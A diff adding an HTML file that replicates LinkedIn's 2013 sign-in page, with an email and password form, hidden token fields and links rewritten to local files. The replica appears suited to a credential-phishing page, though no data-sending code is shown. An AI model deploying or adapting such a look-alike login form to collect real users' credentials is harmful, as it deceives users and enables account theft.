@@ -1,0 +1,108 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+  <title></title>
+  <link href="signin.css" rel="stylesheet" type="text/css" />
+</head>
+<body class="background">
+
+  <div id="header" class="global-header responsive-header nav-v5-2-header responsive-1" role="banner">
+   <div id="top-header">
+     <div class="wrapper">
+      <h2 class="logo-container">
+        <a href="home.html" class="logo" id="li-logo">
+          LinkedIn Home
+        </a>
+      </h2>
+      <ul class="nav main-nav guest-nav" role="navigation">
+        <li class="nav-item">
+          <a href="linkedin.html" class="nav-link">
+            What is LinkedIn?
+          </a>
+        </li>
+        <li class="nav-item">
+          <a href="join.html" class="nav-link" rel="nofollow">
+            Join Today
+          </a>
+        </li>
+        <li class="nav-item">
+         <a href="signin.html" class="nav-link" rel="nofollow">
+           Sign In
+         </a>
+       </li>
+     </ul>
+   </div>
+ </div>
+ 
+</div>
+
+<div id="body1" class="" role="main">
+ <div id="page-title"><h1>Sign in to LinkedIn</h1></div>
+ <div class="wrapper">
+  <div id="global-error">
+  </div>
+  <div id="main" class="signin">
+    <div id="cookieDisabled" style="display: none;">Make sure you have cookies and Javascript enabled in your browser before signing in.</div>
+    <form action="/uas/login-submit" method="POST" name="login" novalidate="novalidate" id="login" class="ajax-form" data-jsenabled="check">
+      
+      <input type="hidden" name="isJsEnabled" value="true">
+
+      <input type="hidden" name="source_app" value="">
+
+      <input type="hidden" name="tryCount" id="tryCount" value="">
+
+      <ul>
+        <li>
+          <label for="session_key-login">Email&nbsp;address:</label>
+          <div class="fieldgroup">
+            <span class="error" id="session_key-login-error"></span>
+            
+            <input type="text" name="session_key" value="" id="session_key-login" tabindex="1" data-ime-mode-disabled="">
+            
+          </div>
+        </li>
+        <li>
+          <label for="session_password-login">Password:</label>
+          <div class="fieldgroup">
+            <span class="error" id="session_password-login-error"></span>
+            
+            <input type="password" name="session_password" value="" id="session_password-login" tabindex="2">
+            
+            <a href="password.html">Forgot password?</a>
+          </div>
+        </li>
+        <li class="button">
+          <input type="submit" name="signin" value="Sign In" tabindex="3" class="btn-primary" id="btn-primary">
+          <span class="hidden">   or <a href="join.html" tracking="signin_join" class="nav-link">Join LinkedIn</a></span>
+        </li>
+      </ul>          
+      <input type="hidden" name="session_redirect" value="" id="session_redirect-login"><input type="hidden" name="csrfToken" value="ajax:5555493636125268835" id="csrfToken-login"><input type="hidden" name="sourceAlias" value="0_7r5yezRXCiA_H0CRD8sf6DhOjTKUNps5xGTqeX8EEoi" id="sourceAlias-login"><input type="hidden" name="goback" value=".nmp_*1_*1_*1_*1_*1_*1_*1_*1_*1_*1" id="goback-login">
+      <div class="screen"></div></form>
+    </div>
+  </div>
+</div>
+
+
+<div id="footer">
+ <div class="wrapper">
+   
+   <p id="copyright" class="guest"><span>LinkedIn Corporation</span> &#169; 2013</p>
+
+
+   <ul class="nav-footer">
+     <li><a href="agrement.html">User Agreement</a></li>
+     <li><a href="signin.html">Privacy Policy</a></li>
+     <li>
+       
+       <a href="signin.html" target="_blank" rel="nofollow">Community Guidelines</a>
+     </li>
+     <li><a href="signin.html">Cookie Policy</a></li>
+     <li class="last"><a href="signin.html">Copyright Policy</a></li>
+
+   </ul>
+ </div>
+</div>
+
+
+</body>
+</html>
